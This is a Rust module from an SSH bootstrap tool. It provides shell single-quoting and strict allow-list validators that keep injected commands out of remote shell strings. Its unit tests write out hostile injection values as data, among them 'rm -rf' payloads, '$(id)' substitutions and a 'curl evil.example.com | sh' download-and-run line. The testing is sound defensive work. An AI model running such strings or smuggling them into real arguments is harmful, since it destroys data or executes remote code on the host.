//! Constants shared by the two independent isekai-helper bootstrap
//! implementations: `rust-core/src/helper_bootstrap.rs` (Android, over a
//! `russh::client::Handle`) and `isekai-bootstrap::openssh` (the `isekai-ssh`
//! CLI, over spawned `ssh(1)` subprocesses). Both upload the same binary to
//! the same path and poll for the same handshake-file contract
//! (`archive/HELPER_PROTOCOL.md`), so the remote-side paths/filenames must actually
//! be identical — keeping them as one shared `const` rather than two
//! hand-copied literals is what guarantees that, not just documents it.
//!
//! `isekai-terminal-core` is built as a `cdylib`/`staticlib` and can't be
//! depended on as an ordinary Rust crate, so `rust-core/src/helper_bootstrap.rs`
//! can't just import `isekai-bootstrap` directly — but both it and
//! `isekai-bootstrap` already depend on this pure `isekai-protocol` crate, so
//! this is where the shared literals live.

/// Remote install directory for the deployed binary.
pub const ISEKAI_PIPE_INSTALL_DIR: &str = "~/.local/bin";
/// Remote filename of the deployed binary (`isekai-pipe`, launched remotely
/// as `isekai-pipe serve ...`; formerly the standalone `isekai-helper`
/// binary before it was merged into `isekai-pipe`,
/// `archive/ISEKAI_PIPE_MIGRATION.md` P5).
pub const ISEKAI_PIPE_BIN_NAME: &str = "isekai-pipe";
/// How many times the bootstrap remote shell polls for the handshake file to
/// become non-empty before giving up.
pub const HANDSHAKE_POLL_ATTEMPTS: u32 = 50;
/// Delay between handshake-file polls, in milliseconds.
pub const HANDSHAKE_POLL_INTERVAL_MS: u32 = 100;

use crate::error::ProtocolError;

/// Single-quotes `s` for safe interpolation into a POSIX shell command
/// string, escaping embedded single quotes with the standard `'\''` trick
/// (close the quoted string, emit an escaped literal `'`, reopen the quoted
/// string). The result is always safe to splice into a `format!`-built shell
/// command regardless of `s`'s contents (security review #57 — both
/// `rust-core/src/helper_bootstrap.rs` and `isekai-bootstrap::openssh`
/// interpolate externally-supplied strings like `relay_sni`/`relay_jwt` into
/// a command string executed via a remote login shell, and previously did so
/// unquoted).
pub fn shell_single_quote(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('\'');
    for ch in s.chars() {
        if ch == '\'' {
            out.push_str("'\\''");
        } else {
            out.push(ch);
        }
    }
    out.push('\'');
    out
}

/// Characters allowed in `relay_sni`/`relay_jwt` once validated
/// (`validate_relay_sni`/`validate_relay_jwt`). Shared because a JWT
/// (base64url segments joined by `.`) and a DNS/SNI hostname happen to admit
/// the exact same strict charset.
fn is_allowed_bootstrap_arg_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-')
}

fn validate_charset(field: &'static str, value: &str) -> Result<(), ProtocolError> {
    if value.is_empty() {
        return Err(ProtocolError::InvalidBootstrapArg {
            field,
            reason: "must not be empty".to_string(),
        });
    }
    if let Some(bad) = value.chars().find(|c| !is_allowed_bootstrap_arg_char(*c)) {
        return Err(ProtocolError::InvalidBootstrapArg {
            field,
            reason: format!("contains disallowed character {bad:?} (allowed: A-Za-z0-9._-)"),
        });
    }
    Ok(())
}

/// Validates a `--relay-sni` value (TLS SNI / HTTP authority for the MASQUE
/// relay) against a strict allow-list charset, *in addition to*
/// shell-quoting it before interpolation (`shell_single_quote`). Defense in
/// depth: a compromised or misconfigured relay-issuing server should not be
/// able to smuggle shell metacharacters into a value that ends up in a
/// remote bootstrap command string, even if the quoting logic itself ever
/// regresses.
pub fn validate_relay_sni(sni: &str) -> Result<(), ProtocolError> {
    validate_charset("relay_sni", sni)
}

/// Validates a `--relay-jwt`/`--relay-jwt-file` value (the MASQUE relay
/// bearer token) against a strict allow-list charset: base64url alphabet
/// (`A-Za-z0-9_-`) plus `.` as the JWT segment separator. Same
/// defense-in-depth rationale as `validate_relay_sni`.
pub fn validate_relay_jwt(jwt: &str) -> Result<(), ProtocolError> {
    validate_charset("relay_jwt", jwt)
}

/// Characters allowed in a `#@isekai remote-path` value once validated
/// (`validate_remote_path`): the usual bootstrap-arg charset plus `/` (path
/// separator) and `~` (leading home-directory shorthand, expanded by the
/// remote shell itself — this is why the value is deliberately *not*
/// `shell_single_quote`-wrapped like `relay_sni` before interpolation, single
/// quoting would suppress that expansion).
fn is_allowed_remote_path_char(c: char) -> bool {
    is_allowed_bootstrap_arg_char(c) || matches!(c, '/' | '~')
}

/// Validates a `#@isekai remote-path` value against a strict allow-list
/// charset before it is interpolated into a remote bootstrap shell command
/// string (same defense-in-depth rationale as `validate_relay_sni`/
/// `validate_relay_jwt` — this value comes from the user's own `ssh_config`,
/// but a corrupted or attacker-controlled config file must not be able to
/// smuggle shell metacharacters into the remote command).
pub fn validate_remote_path(path: &str) -> Result<(), ProtocolError> {
    if let Some(bad) = path.chars().find(|c| !is_allowed_remote_path_char(*c)) {
        return Err(ProtocolError::InvalidBootstrapArg {
            field: "remote_path",
            reason: format!("contains disallowed character {bad:?} (allowed: A-Za-z0-9._-/~)"),
        });
    }
    if path.is_empty() {
        return Err(ProtocolError::InvalidBootstrapArg {
            field: "remote_path",
            reason: "must not be empty".to_string(),
        });
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shell_single_quote_wraps_plain_values() {
        assert_eq!(shell_single_quote("hello"), "'hello'");
        assert_eq!(shell_single_quote(""), "''");
    }

    #[test]
    fn shell_single_quote_escapes_embedded_quotes() {
        assert_eq!(shell_single_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn shell_single_quote_neutralizes_shell_metacharacters() {
        // The whole point: even a maximally hostile value must round-trip as
        // an inert literal, never as executable shell syntax.
        let hostile = "'; rm -rf ~ #$(whoami)`id`";
        let quoted = shell_single_quote(hostile);
        // Reconstruct what a POSIX shell would see if it echoed the quoted
        // string back out, by feeding it through the exact same
        // single-quote escaping rules a shell itself applies: the value is
        // only ever inside single quotes or escaped single-quote literals.
        assert!(quoted.starts_with('\''));
        assert!(quoted.ends_with('\''));
        // No unescaped `'` should appear anywhere except as part of the
        // `'\''`escape sequence or the opening/closing quotes.
        let mut chars = quoted.chars().peekable();
        chars.next(); // opening quote
        while let Some(c) = chars.next() {
            if c == '\'' {
                // Must be either the final closing quote or the start of an
                // escape sequence `'\''`.
                if chars.peek().is_some() {
                    assert_eq!(chars.next(), Some('\\'));
                    assert_eq!(chars.next(), Some('\''));
                    assert_eq!(chars.next(), Some('\''));
                }
            }
        }
    }

    #[test]
    fn validate_relay_sni_accepts_typical_hostname() {
        assert!(validate_relay_sni("relay.example.com").is_ok());
    }

    #[test]
    fn validate_relay_sni_rejects_empty() {
        assert!(validate_relay_sni("").is_err());
    }

    #[test]
    fn validate_relay_sni_rejects_shell_metacharacters() {
        assert!(validate_relay_sni("relay.example.com; rm -rf /").is_err());
        assert!(validate_relay_sni("$(id)").is_err());
        assert!(validate_relay_sni("`id`").is_err());
    }

    #[test]
    fn validate_relay_jwt_accepts_typical_jwt() {
        assert!(validate_relay_jwt("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U").is_ok());
    }

    #[test]
    fn validate_relay_jwt_rejects_empty() {
        assert!(validate_relay_jwt("").is_err());
    }

    #[test]
    fn validate_relay_jwt_rejects_shell_metacharacters() {
        assert!(validate_relay_jwt("abc.def.ghi; rm -rf /").is_err());
        assert!(validate_relay_jwt("$(id)").is_err());
    }

    #[test]
    fn validate_remote_path_accepts_typical_paths() {
        assert!(validate_remote_path("~/.local/bin/isekai-pipe").is_ok());
        assert!(validate_remote_path("/opt/isekai-pipe/bin/isekai-pipe").is_ok());
    }

    #[test]
    fn validate_remote_path_rejects_empty() {
        assert!(validate_remote_path("").is_err());
    }

    #[test]
    fn validate_remote_path_rejects_shell_metacharacters() {
        assert!(validate_remote_path("~/bin; rm -rf /").is_err());
        assert!(validate_remote_path("$(id)").is_err());
        assert!(validate_remote_path("`id`").is_err());
        assert!(validate_remote_path("~/bin && curl evil.example.com | sh").is_err());
    }
}
